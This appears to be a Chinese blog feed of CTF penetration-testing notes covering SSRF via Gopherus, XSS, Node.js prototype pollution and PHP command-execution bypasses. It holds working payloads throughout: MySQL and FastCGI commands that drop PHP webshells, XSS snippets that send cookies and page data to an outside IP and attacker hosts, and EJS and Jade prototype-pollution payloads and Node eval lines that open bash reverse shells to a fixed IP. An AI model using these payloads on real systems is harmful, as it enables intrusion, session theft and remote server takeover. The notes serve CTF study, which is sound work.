<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br><span class="line"></span><br><span class="line">使用into outfile:</span><br><span class="line">Give MySQL username: root                                                                        </span><br><span class="line">Give query to execute: select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="2打postgresql无密码"><a class="markdownIt-Anchor" href="#2打postgresql无密码"></a> 2.打PostgreSQL(无密码):</h2>
<ul>
<li>PostgreSQL：如果用户没有受到密码保护，您可以转储他的数据库，也可以将恶意文件放入他的系统中。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python2 gopherus.py <span class="comment">--exploit postgresql</span></span><br></pre></td></tr></table></figure>
<h2 id="3打fastcgi"><a class="markdownIt-Anchor" href="#3打fastcgi"></a> 3.打FastCGI:</h2>
<p>fastcgi协议则是服务器中间件和某个语言后端（如PHP-FPM）进行数据交换的协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 gopherus.py --exploit fastcgi</span><br><span class="line">它只要求一个必须存在于受害者系统中的文件（最好是.php文件），顺便说一句，我们有默认的文件。</span><br><span class="line"></span><br><span class="line">if you don&#x27;t know press ENTER we have default one:  /var/www/html/index.php                                    </span><br><span class="line">Terminal command to run:  echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOzs/Pgo= | base64 -d &gt; /var/www/html/1.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="4打redis"><a class="markdownIt-Anchor" href="#4打redis"></a> 4.打redis:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 gopherus.py --exploit redis</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>xss</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/xss/</url>
    <content><![CDATA[<h1 id="常见过滤"><a class="markdownIt-Anchor" href="#常见过滤"></a> 常见过滤:</h1>
<h2 id="如果使用了http-only"><a class="markdownIt-Anchor" href="#如果使用了http-only"></a> 如果使用了http-only:</h2>
<h3 id="1get请求外带"><a class="markdownIt-Anchor" href="#1get请求外带"></a> 1.GET请求外带:</h3>
<p>GET外带：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET方式外带接口返回的数据</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;接口&#x27;</span>, <span class="literal">false</span>); </span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Image</span>().src = <span class="string">&#x27;http://139.224.54.229/xss_demo/get_re.php?data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t.<span class="title function_ invoke__">slice</span>(<span class="number">0</span>, <span class="number">2000</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>POST外带:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// POST方式外带接口返回的数据</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/api/?page=1&amp;limit=10&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="comment">// 发送到攻击者服务器</span></span><br><span class="line">    <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr2.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;https://attacker.com/post&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr2.<span class="title function_ invoke__">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">    xhr2.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2post请求外带"><a class="markdownIt-Anchor" href="#2post请求外带"></a> 2.POST请求外带:</h3>
<p>GET外带：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. POST请求读取目标接口内容</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/api/?page=1&amp;limit=10&#x27;</span>, <span class="literal">false</span>); </span><br><span class="line">xhr.<span class="title function_ invoke__">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;a=1&amp;b=2&#x27;</span>); </span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Image</span>().src = <span class="string">&#x27;http://139.224.54.229/xss_demo/get_re.php?data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t.<span class="title function_ invoke__">slice</span>(<span class="number">0</span>, <span class="number">2000</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>POST外带:</p>
<h1 id="利用手法"><a class="markdownIt-Anchor" href="#利用手法"></a> 利用手法:</h1>
<h2 id="1xss原理的分析"><a class="markdownIt-Anchor" href="#1xss原理的分析"></a> 1.xss原理的分析:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">向网站注入恶意JavaScript代码，让别人的浏览器在受信任的网页上下文中“执行攻击者的脚本”。</span><br></pre></td></tr></table></figure>
<h2 id="2-检测方式"><a class="markdownIt-Anchor" href="#2-检测方式"></a> 2. 检测方式:</h2>
<table>
<thead>
<tr>
<th>场景/说明</th>
<th>Payload示例</th>
<th>备注/实战效果</th>
</tr>
</thead>
<tbody>
<tr>
<td>经典弹窗</td>
<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
<td>判断能否插入原生JS</td>
</tr>
<tr>
<td>双引号闭合</td>
<td><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
<td>用于参数被包在引号里</td>
</tr>
<tr>
<td>单引号闭合</td>
<td><code>'&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
<td>同上</td>
</tr>
<tr>
<td>img标签onerror</td>
<td><code>&lt;img src=1 onerror=alert(1)&gt;</code></td>
<td>绕过部分过滤，低版本IE必弹窗</td>
</tr>
<tr>
<td>svg标签onload</td>
<td><code>&lt;svg/onload=alert(1)&gt;</code></td>
<td>对svg支持较弱站点，能绕标签限制</td>
</tr>
<tr>
<td>body标签onload</td>
<td><code>&lt;body onload=alert(1)&gt;</code></td>
<td>HTML主体注入点</td>
</tr>
<tr>
<td>input标签onfocus</td>
<td><code>&lt;input autofocus onfocus=alert(1)&gt;</code></td>
<td>页面插入input时测试</td>
</tr>
<tr>
<td>a标签onclick</td>
<td><code>&lt;a href=&quot;#&quot; onclick=alert(1)&gt;点我&lt;/a&gt;</code></td>
<td>需用户操作</td>
</tr>
<tr>
<td>script块注入</td>
<td><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
<td>封闭script后再注入新的</td>
</tr>
<tr>
<td>js事件属性（万能型）</td>
<td><code>&lt;button onmouseover=alert(1)&gt;XSS&lt;/button&gt;</code></td>
<td>鼠标事件型绕过</td>
</tr>
<tr>
<td>html注释穿插</td>
<td><code>&lt;!--&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</code></td>
<td>盲测注释处理不严的模板</td>
</tr>
<tr>
<td>盲打型payload</td>
<td><code>&lt;img src=1 onerror=fetch('//你的域名/log?c='+document.cookie)&gt;</code></td>
<td>无回显场景，后台日志收集</td>
</tr>
<tr>
<td>反射测试</td>
<td><code>&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;</code></td>
<td>方便区分当前站点</td>
</tr>
<tr>
<td>DOM型测试</td>
<td><code>#&quot;&gt;&lt;script&gt;alert(document.location)&lt;/script&gt;</code></td>
<td>DOM拼接位置必测</td>
</tr>
<tr>
<td>href/jump跳转型</td>
<td><code>javascript:alert(1)</code></td>
<td>测url跳转、链接、按钮</td>
</tr>
</tbody>
</table>
<h2 id="3常见img回流"><a class="markdownIt-Anchor" href="#3常见img回流"></a> 3.常见img回流:</h2>
<h3 id="1分类"><a class="markdownIt-Anchor" href="#1分类"></a> 1.分类:</h3>
<table>
<thead>
<tr>
<th>场景/目的</th>
<th>payload示例</th>
<th>说明/攻防技巧</th>
</tr>
</thead>
<tbody>
<tr>
<td>标准最常用</td>
<td><code>&lt;img src=&quot;http://your.com/xss.php?cookie=&quot;+document.cookie&gt;</code></td>
<td>简单直观，很多场景可用</td>
</tr>
<tr>
<td>利用onerror事件</td>
<td><code>&lt;img src=1 onerror=&quot;new Image().src='http://your.com/xss.php?cookie='+document.cookie&quot;&gt;</code></td>
<td>兼容性强，可防止部分src过滤</td>
</tr>
<tr>
<td>onerror多参数</td>
<td><code>&lt;img src=x onerror=&quot;this.src='http://your.com/xss.php?cookie='+document.cookie&quot;&gt;</code></td>
<td>利用自身src属性，无需new对象</td>
</tr>
<tr>
<td>base64绕过</td>
<td><code>&lt;img src=1 onerror=&quot;new Image().src=atob('aHR0cDovL3lvdXIuY29tL3hzcw==')+document.cookie&quot;&gt;</code></td>
<td>避免明文URL被过滤</td>
</tr>
<tr>
<td>多事件联合</td>
<td><code>&lt;img src=1 onerror=&quot;document.body.appendChild(new Image()).src='http://your.com/xss.php?cookie='+document.cookie&quot;&gt;</code></td>
<td>兼容部分内联过滤</td>
</tr>
<tr>
<td>利用fetch</td>
<td><code>&lt;img src=1 onerror=&quot;fetch('http://your.com/xss.php?cookie='+document.cookie)&quot;&gt;</code></td>
<td>某些现代浏览器可用</td>
</tr>
<tr>
<td>伪装UA等信息回流</td>
<td><code>&lt;img src=&quot;http://your.com/xss.php?info=&quot;+navigator.userAgent+document.cookie&gt;</code></td>
<td>携带更多信息</td>
</tr>
<tr>
<td>GET+POST联合</td>
<td><code>&lt;img src=1 onerror=&quot;var i=new Image();i.src='http://your.com/xss.php?c='+document.cookie&quot;&gt;</code></td>
<td>多种变量名，规避WAF</td>
</tr>
</tbody>
</table>
<h3 id="2区别"><a class="markdownIt-Anchor" href="#2区别"></a> 2.区别:</h3>
<table>
<thead>
<tr>
<th>payload类型</th>
<th>隐蔽性</th>
<th>兼容性</th>
<th>是否跳转</th>
<th>攻防用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>img+src</td>
<td>高</td>
<td>很高</td>
<td>否</td>
<td>首选，适合所有场景</td>
</tr>
<tr>
<td>img+onerror</td>
<td>很高</td>
<td>极高</td>
<td>否</td>
<td>绕过滤</td>
</tr>
<tr>
<td>location.href</td>
<td>低</td>
<td>高</td>
<td>是</td>
<td>测试/盲打为主</td>
</tr>
<tr>
<td>fetch/xmlhttp</td>
<td>中</td>
<td>中高</td>
<td>否</td>
<td>现代浏览器为主</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>nodejs</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/nodejs/</url>
    <content><![CDATA[<h1 id="语法函数"><a class="markdownIt-Anchor" href="#语法函数"></a> 语法函数:</h1>
<h2 id="1eval函数"><a class="markdownIt-Anchor" href="#1eval函数"></a> 1.eval()函数:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行 JS 表达式/代码字符串</span><br><span class="line">require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()     --普通的用于eval()</span><br><span class="line">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /app/routes/login.js&#x27;).toString()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>特性</th>
<th><code>eval()</code></th>
<th><code>child_process.exec()</code> / <code>execSync()</code> 等</th>
</tr>
</thead>
<tbody>
<tr>
<td>功能</td>
<td>执行 JS 表达式/代码字符串</td>
<td>执行系统命令，调用 shell</td>
</tr>
<tr>
<td>执行环境</td>
<td>JavaScript 运行时</td>
<td>操作系统 shell（bash/cmd）</td>
</tr>
<tr>
<td>数据类型</td>
<td>仅 JS 数据（字符串、对象等）</td>
<td>任意系统命令输出（Buffer/String）</td>
</tr>
<tr>
<td>返回值</td>
<td>JS 表达式的结果</td>
<td>子进程的输出（stdout）</td>
</tr>
<tr>
<td>安全风险</td>
<td>高 —— 代码注入</td>
<td>高 —— 命令注入</td>
</tr>
<tr>
<td>CTF利用点</td>
<td>SSTI、模板注入等可拼接 JS 表达式</td>
<td>文件上传后配合执行；命令拼接</td>
</tr>
<tr>
<td>防御建议</td>
<td>禁用 <code>eval</code>；使用沙箱或 <code>vm</code> 模块</td>
<td>参数白名单；转义特殊字符</td>
</tr>
</tbody>
</table>
<h4 id="1过滤"><a class="markdownIt-Anchor" href="#1过滤"></a> 1.过滤:</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(&#x27;child_process&#x27;)[&#x27;exe&#x27;+&#x27;cSync&#x27;](&#x27;ls&#x27;)</span><br><span class="line">require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;).stdout</span><br><span class="line">Buffer.from(input[, encoding])</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>input</td>
<td>要转换的数据（字符串或数组）</td>
</tr>
<tr>
<td>encoding</td>
<td>编码方式（常用有：<code>utf8</code>, <code>base64</code>, <code>hex</code>, <code>binary</code>）</td>
</tr>
</tbody>
</table>
<h2 id="2resrender函数"><a class="markdownIt-Anchor" href="#2resrender函数"></a> 2.res.render()函数:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">render</span>(view, locals, callback)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>view</code></td>
<td>模板名称（不带扩展名），如 <code>index</code></td>
</tr>
<tr>
<td><code>locals</code></td>
<td>传入模板的数据对象，如 <code>&#123;username: 'admin'&#125;</code></td>
</tr>
<tr>
<td><code>callback</code>（可选）</td>
<td>如果提供，则不会自动发送响应，而是返回 HTML 字符串</td>
</tr>
</tbody>
</table>
<h1 id="原型链污染"><a class="markdownIt-Anchor" href="#原型链污染"></a> 原型链污染:</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">能修改 <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>，就能影响所有对象</span><br></pre></td></tr></table></figure>
<h2 id="1functon"><a class="markdownIt-Anchor" href="#1functon"></a> 1.Functon()():</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">传入bash去运行   bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/<span class="number">139.224</span><span class="number">.54</span><span class="number">.229</span>/<span class="number">9090</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">有可能需要两次bash： bash -c \<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;</span></span><br><span class="line"><span class="string">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1&#x27;)</span></span><br><span class="line"><span class="string">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;&#x27;)</span></span><br></pre></td></tr></table></figure>
<h2 id="2ejs的-rce"><a class="markdownIt-Anchor" href="#2ejs的-rce"></a> 2.ejs的 rce:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">payload</span>:</span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3jade的rce"><a class="markdownIt-Anchor" href="#3jade的rce"></a> 3.jade的rce:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Block&quot;</span>,<span class="string">&quot;nodes&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">注意:   <span class="title class_">Content</span>-<span class="title class_">Type</span>:application/json</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>命令执行</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat f*&#x27;</span>);              --通过*通配符来绕过检测</span><br><span class="line">         也可以用cat f???</span><br><span class="line">?c=<span class="keyword">echo</span> `ls`;                     --在Shell 脚本或命令行中，反引号` ` 和 $() 用于执行命令并获取其输出。</span><br><span class="line">            --反引号 是“shell 执行操作符” —— 类似于<span class="title function_ invoke__">shell_exec</span>()`</span><br><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);        --<span class="keyword">eval</span>() 会把传入的字符串当成PHP代码执行。</span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php      --include期望一个字符串形式的文件名或路径。</span></span><br><span class="line">c=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat f*&quot;)?&gt;            --将输入的作为代码执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="1思考"><a class="markdownIt-Anchor" href="#1思考"></a> 1.思考：</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">通过ls -ld .来查看该目录的权限</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch 1.php&#x27;</span>);           --通过touch创建一个文件</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo &quot;content&quot; | cat &gt;&gt; 1.php&#x27;</span>);    --通过cat重定向将输入内容写入文件，但是不能理解为什么如果写入内容是一句话木马就写入不了     ---字符转义 一句话马里面的字符会转义 或者闭合，先编码在写入，关键是单引号的转义</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ls -ld .:</p>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250331210855166.png" alt="image-20250331210855166" /></p>
<h3 id="一些绕过"><a class="markdownIt-Anchor" href="#一些绕过"></a> 一些绕过</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">空格的绕过可以使用%<span class="number">0</span>a代替     --%<span class="number">0</span>a换行符</span><br><span class="line">分号可以用<span class="meta">?&gt;</span>代替</span><br><span class="line">小数点可以用<span class="title function_ invoke__">localeconv</span>()     --函数返回小数点</span><br><span class="line">php中<span class="keyword">include</span>是可以不带括号的函数 ----过滤括号时使用</span><br><span class="line">空格(%<span class="number">20</span>)、制表符(%<span class="number">09</span>)、换行符(%<span class="number">0</span>a)、回车符(%<span class="number">0</span>d)、空字节符(%<span class="number">00</span>)、垂直制表符（%<span class="number">0</span>b），换页符（%<span class="number">0</span>c）</span><br></pre></td></tr></table></figure>
<h4 id="对空格的绕过"><a class="markdownIt-Anchor" href="#对空格的绕过"></a> 对空格的绕过</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;IFS&#125; 但不能写作 <span class="variable">$IFS</span>       --在 Linux/Bash 中内部字段分隔符，<span class="variable">$IFS</span>默认是空格、Tab、换行。空格可以被 $&#123;IFS&#125; 替代</span><br><span class="line">$IFS$<span class="number">9</span>                 --内部字段分隔符（第一个字符是空格） 第 <span class="number">9</span> 个位置参数（通常为空）</span><br><span class="line">%<span class="number">09</span>                   --URL 编码的 Tab 字符</span><br><span class="line">&lt;&gt;                 </span><br><span class="line">&lt;                      --输入重定向，例如 cat &lt; flag</span><br><span class="line"><span class="variable">$IFS</span>%<span class="number">09</span></span><br></pre></td></tr></table></figure>
<h3 id="php伪协议"><a class="markdownIt-Anchor" href="#php伪协议"></a> php伪协议</h3>
<p>php支持的伪协议：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="number">2</span> http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">  glob:<span class="comment">//* 是一个 伪协议    ----可以用来绕过open_basedir用于通过 fopen()、file_get_contents() 等函数读取匹配文件的内容</span></span><br><span class="line"><span class="number">3</span> ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="number">4</span> php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="number">5</span> zlib:<span class="comment">// — 压缩流</span></span><br><span class="line"><span class="number">6</span> data:<span class="comment">// — 数据（RFC 2397）       </span></span><br><span class="line"><span class="number">7</span> glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="number">8</span> phar:<span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="number">9</span> ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="number">10</span> rar:<span class="comment">// — RAR</span></span><br><span class="line"><span class="number">11</span> ogg:<span class="comment">// — 音频流</span></span><br><span class="line"><span class="number">12</span> expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
<h4 id="1flie"><a class="markdownIt-Anchor" href="#1flie"></a> 1.flie://</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php      --convert.base64-encode，就是一种过滤器</span></span><br><span class="line">php:<span class="comment">//filter/resource=index.php       --没有base64编码，源码可能无法显示(部分字符被浏览器解析)</span></span><br></pre></td></tr></table></figure>
<h4 id="2data"><a class="markdownIt-Anchor" href="#2data"></a> 2.data://</h4>
<p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php phpinfo();?&gt;   </span></span><br><span class="line">如果要使用:data:<span class="comment">//必须打开    --but这两个是默认关闭</span></span><br><span class="line">allow_url_include=On</span><br><span class="line">allow_url_fopen=On</span><br></pre></td></tr></table></figure>
<h4 id="flie与data的区别include-xxx-includexxx"><a class="markdownIt-Anchor" href="#flie与data的区别include-xxx-includexxx"></a> flie://与data//的区别（include ‘xxx’; include(“xxx”);）</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250401164926563.png" alt="image-20250401164926563" /></p>
<h2 id="使用函数拿到flag"><a class="markdownIt-Anchor" href="#使用函数拿到flag"></a> 使用函数拿到flag</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">getallheaders</span>()：返回所有的HTTP头信息，返回的是数组而<span class="keyword">eval</span>要求为字符串，所以要用<span class="title function_ invoke__">implode</span>()函数将数组转换为字符串</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">get_defined_vars</span>()：该函数的作用是获取所有的已定义变量，返回值也是数组，不过是二维数组，用<span class="title function_ invoke__">var_dump</span>()输出可以看见输出的内容，看见在第几位之后，可以用<span class="title function_ invoke__">current</span>()函数来获取其值，详细可以看官方函数。</span><br><span class="line">payload：<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>()));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_id</span>()：<span class="title function_ invoke__">session_id</span>()可以用来获取/设置当前会话 ID，可以用这个函数来获取cookie中的phpsessionid，并且这个值我们是可控的。</span><br><span class="line">    如可以在cookie中设置 PHPSESSID=<span class="number">706870696e666</span>f28293b，然后用<span class="title function_ invoke__">hex2bin</span>()函数，</span><br><span class="line">    即传入?exp=<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));     </span><br><span class="line">    并设置cookie：PHPSESSID=<span class="number">706870696e666</span>f28293b</span><br><span class="line">    session_start 函数是为了开启session</span><br><span class="line">    </span><br><span class="line">配合使用的函数：</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(‘.’)); 查看当前目录下的所有文件名</span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>()</span><br><span class="line">	<span class="title function_ invoke__">localeconv</span>() 函数返回一包含本地数字及货币格式信息的数组。   --第一个值为小数点.</span><br><span class="line">	<span class="title function_ invoke__">current</span>() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</span><br><span class="line">	<span class="title function_ invoke__">each</span>() 返回数组中当前的键/值对并将数组指针向前移动一步</span><br><span class="line">	<span class="title function_ invoke__">end</span>() 将数组的内部指针指向最后一个单元</span><br><span class="line">	<span class="title function_ invoke__">next</span>() 将数组中的内部指针向前移动一位</span><br><span class="line">	<span class="title function_ invoke__">prev</span>() 将数组中的内部指针倒回一位</span><br><span class="line">	<span class="title function_ invoke__">array_reverse</span>() 以相反的元素顺序返回数组</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="使用函数getallheaders"><a class="markdownIt-Anchor" href="#使用函数getallheaders"></a> 使用函数getallheaders()：</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">getallheaders</span>()));构造这个，问题是如果没有 <span class="keyword">eval</span>()，会被当做字符串，而不会被执行</span><br><span class="line">Zzzzzz:<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);     ----配合这个使用</span><br></pre></td></tr></table></figure>
<h3 id="对使用-或运算得到答案"><a class="markdownIt-Anchor" href="#对使用-或运算得到答案"></a> 对使用| 或运算得到答案</h3>
<p>利用穷举脚本，来通过或运算获得我们想要的字符    —py</p>
<h2 id="devnull"><a class="markdownIt-Anchor" href="#devnull"></a> /dev/null</h2>
